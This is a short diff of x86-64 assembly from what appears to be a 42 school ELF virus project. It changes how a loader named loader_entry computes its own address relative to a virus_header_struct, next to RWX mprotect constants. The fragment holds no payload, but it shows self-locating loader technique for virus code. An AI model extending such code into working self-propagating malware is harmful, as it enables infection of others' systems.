@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/12/27 01:29:25 by anselme          ###   ########.fr        ;
+;    Updated: 2019/12/27 01:37:15 by anselme          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -14,7 +14,6 @@
 %define SYSCALL_MPROTECT	0x0a
 %define STDOUT			0x01
 %define PROT_RWX		0x07
-%define CALL_INSTR_SIZE		0x05
 
 section .text
 	global loader_entry
@@ -62,7 +61,7 @@ mark_below:
 	mov r14, [r14]
 
 	mov rax, rdx               ; get loader_entry addr
-	sub rax, CALL_INSTR_SIZE
+	sub rax, virus_header_struct - loader_entry
 
 	push r15                   ; backup r15
 	mov r15, rax
